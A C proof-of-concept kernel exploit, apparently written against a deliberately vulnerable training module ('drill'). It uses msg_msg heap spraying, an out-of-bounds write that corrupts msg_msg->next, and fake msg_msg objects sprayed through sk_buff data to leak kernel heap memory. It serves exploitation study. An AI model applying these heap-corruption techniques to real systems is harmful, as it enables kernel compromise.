/*
 * Funny experiments with Linux kernel exploitation:
 * a basic out‑of‑bounds write exploit that corrupts `msg_msg->next`
 * causing dangling reference to next `msg_msg`; it uses to reclaim
 * victim `msg_msg` with *fake* `msg_msg` created via `sk_buff.data`
 * enabling out-of-bounds reading of the kernel memory
 *
 * Only basic methods. Just for fun.
 *
 * Compile the Linux kernel without:
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_SLAB_FREELIST_RANDOM
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *   - CONFIG_SECURITY_SELINUX
 *
 * Difference from `defconfig`:
 *   - CONFIG_CONFIGFS_FS=y
 *   - CONFIG_SECURITYFS=y
 *   - CONFIG_DEBUG_INFO=y
 *   - CONFIG_DEBUG_INFO_DWARF4=y
 *   - CONFIG_DEBUG_INFO_COMPRESSED_NONE=y
 *   - CONFIG_GDB_SCRIPTS=y
 *   - CONFIG_CHECKPOINT_RESTORE=y
 *   - # CONFIG_SECURITY_SELINUX is not set
 *
 * Exploit runs in five stages:
 *   0. Setup and preparing
 *   1. Heap spray msg_msg in kmalloc-96 and kmalloc-1k caches,
 *      allocating dril_item between two msg_msg from kmalloc-96
 *   2. Memory corruption, achieving dangling reference
 *   3. Verifying corruption to make sure that *two* msg_msg-96
 *      points at *one* msg_msg_1k
 *   4. Reclaiming victim msg_msg-1k message as controllable
 *      fake msg_msg created via sk_buff.data, leaking kernel heap.
 *
 *   This PoC performs out-of-bounds reading of the kernel memory using
 *   a corrupted `msg_msg` and `sk_buff.data`.
 */

#define _GNU_SOURCE

#include <sys/msg.h>
#include <unistd.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <inttypes.h>
#include <sys/socket.h>
#include "drill.h"

#define NUM_MSQIDS              1000
#define MSG_MSG_96_SIZE 	0x50
#define MSG_MSG_1K_SIZE 	0x400

#define NUM_SOCKETS             4
#define NUM_SKBUFFS             128

#define MSG_MSG_SIZE            (sizeof(struct msg_msg))
#define SKB_SHARED_INFO_SIZE    0x140

#define MTYPE_MSG_MSG_96 	0x41
#define MTYPE_MSG_MSG_1K 	0x42
#define MSG_TAG                 0xAAAAAAAA
#define MTYPE_FAKE              0x1337

char fake_msg_msg_1k_buf[MSG_MSG_1K_SIZE - SKB_SHARED_INFO_SIZE];
const int leak_size = 0x800;

struct msg_msg {
	uint64_t m_list_next;
	uint64_t m_list_prev;
	uint64_t m_type;
	uint64_t m_ts;
	uint64_t next;
	uint64_t security;
};

struct {
	long mtype;
	char mtext[MSG_MSG_96_SIZE - MSG_MSG_SIZE];
} msg_msg_96;

struct {
	long mtype;
	char mtext[MSG_MSG_1K_SIZE - MSG_MSG_SIZE];
} msg_msg_1k;

int do_cpu_pinning(int c)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(c, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #%d\n", c);
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size)
{
	for (int i = 0; i < NUM_SOCKETS; i++) {
		for (int j = 0; j < NUM_SKBUFFS; j++) {
			if (write(ss[i][0], buf, size) < 0) {
				perror("[-] write");
				return -1;
			}
		}
	}
	return 0;
}

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
		   uint64_t m_ts, uint64_t next)
{
	msg->m_list_next = m_list_next;
	msg->m_list_prev = m_list_prev;
	msg->m_type = MTYPE_FAKE;
	msg->m_ts = m_ts;
	msg->next = next;
	msg->security = 0;
}

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp)
{
	*(long *)msgp = msgtyp;
	if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
		perror("[-] msgsnd");
		return -1;
	}
	return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
	if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
		perror("[-] msgrcv");
		return -1;
	}
	return 0;
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
	if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
		perror("[-] msgrcv");
		return -1;
	}
	return 0;
}

int main(void)
{
	int fd, s, real_msg_id, fake_msg_id = -1;
	int msqid[NUM_MSQIDS];
	int ret = EXIT_FAILURE;
	int ss[NUM_SOCKETS][2];
	int item_n = 4;
	ssize_t bytes = 0;
	unsigned long msg_seg_leak;
	char err_act[64];
	unsigned long leak_buf[leak_size];

	/*
         * 0. Setup
         */

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	printf("[+] Opening drill_act\n");
	fd = open("/proc/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}

	printf("[*] Initializing message queues...\n");
	for (int i = 0; i < NUM_MSQIDS; i++) {
		if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
			perror("[-] msgget");
			goto end;
		}
	}

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("[-] socket");
		goto end;
	}
	for (int i = 0; i < NUM_SOCKETS; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
			perror("[-] socketpair");
			goto end;
		}
	}

	/*
         * 1. Heap spray
         */

	printf("[*] Spraying msg_msg-96 messages...\n");
	for (int i = 0; i < NUM_MSQIDS; i++) {
		memset(&msg_msg_96, 0, sizeof(msg_msg_96));
		*(int *)&msg_msg_96.mtext[0] = MSG_TAG;
		*(int *)&msg_msg_96.mtext[4] = i;
		if (write_msg(msqid[i], &msg_msg_96, sizeof(msg_msg_96),
			      MTYPE_MSG_MSG_96) < 0)
			goto end;

		if (i == 777) {
			/* place vulnerable drill_item between msg_msg-96 messages */
			printf("[*] Allocating drill_item...\n");
			ret = act(fd, DRILL_ACT_ALLOC, item_n, NULL);
			if (ret == EXIT_FAILURE)
				goto end;
		}
	}

	printf("[*] Spraying msg_msg-1k messages...\n");
	for (int i = 0; i < NUM_MSQIDS; i++) {
		memset(&msg_msg_1k, 0, sizeof(msg_msg_1k));
		*(int *)&msg_msg_1k.mtext[0] = MSG_TAG;
		*(int *)&msg_msg_1k.mtext[4] = i;
		if (write_msg(msqid[i], &msg_msg_1k, sizeof(msg_msg_1k),
			      MTYPE_MSG_MSG_1K) < 0)
			goto end;
	}

	/*
         * 2. Memory corruption
         *
         * After the next step we should have *two* msg_msg-96 messages
         * with two equals msg->next pointers into the same msg_msg-1k msg
         */

	printf("[*] Triggering out-of-bounds write...\n");
	snprintf(err_act, sizeof(err_act), "3 %d 0x0000000000000000 0x4a", item_n);
	bytes = write(fd, err_act, strlen(err_act) + 1);
	if (bytes <= 0) {
		ret = EXIT_FAILURE;
		goto end;
	}

	/*
         * 3. Verifying corruption
         *
         * We corrupted msg_msg-96 and we want to find another one msg_msg-96
         * which is also pointed at the same msg_msg-1k as our corrupted one
         */

	printf("[*] Reading victim msg_msg-1k via corrupted msg_msg-96...\n");
	if (peek_msg(msqid[777 + 1], &msg_msg_1k, sizeof(msg_msg_1k), 1) < 0)
		goto end;
	msg_seg_leak = (*(unsigned long *)&msg_msg_1k.mtext[0]);
	printf("[+] Leaked message text field: %lx\n", msg_seg_leak);

	printf("[*] Attempting to find msg_msg-96 pointing exactly at the same msg_msg-1k...\n");
	for (int i = 0; i <= 777; i++) {
		if (peek_msg(msqid[i], &msg_msg_1k, sizeof(msg_msg_1k), 1) < 0)
			goto end;
		if (*(unsigned long *)&msg_msg_1k.mtext[0] == msg_seg_leak) {
			printf("[+] Find 2nd reference: msg #778 and #%d have the same msg->next\n",
			       i);
			fake_msg_id = 777 + 1;
			real_msg_id = i;
			break;
		}
	}
	if (fake_msg_id == -1 && real_msg_id == -1) {
		printf("[-] Unable to find second reference\n");
		goto end;
	}

	/*
         * 4. Reclaiming victim msg_msg-1k message as controllable fake msg_msg created via sk_buff.data
         */

	printf("[*] Freeing real msg_msg-1k message...\n");
	if (read_msg(msqid[real_msg_id], &msg_msg_1k, sizeof(msg_msg_1k),
		     MTYPE_MSG_MSG_1K) < 0)
		goto end;

	printf("[*] Spraying fake msg_msg-1k messages...\n");
	memset(fake_msg_msg_1k_buf, 0, sizeof(fake_msg_msg_1k_buf));
	build_msg_msg((void *)fake_msg_msg_1k_buf, 0x41414141, 0x42424242, leak_size, 0);
	if (spray_skbuff(ss, fake_msg_msg_1k_buf, sizeof(fake_msg_msg_1k_buf)) < 0)
		goto end;

	printf("[*] Leaking kernel heap via fake msg_msg-1k message...\n");
	bytes = msgrcv(msqid[fake_msg_id], leak_buf, leak_size, 1,
		       IPC_NOWAIT | MSG_COPY);
	if (bytes < 0) {
		goto end;
	}

	printf("[+] Leak succeed, %zd bytes received. Printing non-zero values:\n",
	       bytes);
	for (int i = 0; i < bytes / sizeof(unsigned long); ++i) {
		if (leak_buf[i])
			printf("  %3d: 0x%016lx\n", i, leak_buf[i]);
	}

	ret = EXIT_SUCCESS;

end:
	if (ret == EXIT_FAILURE)
		printf("\n[-] Exploit failed!\n");
	else
		printf("\n[+] The end! \n");

	if (fd >= 0) {
		if (close(fd) < 0)
			perror("[-] close fd");
	}

	return ret;
}
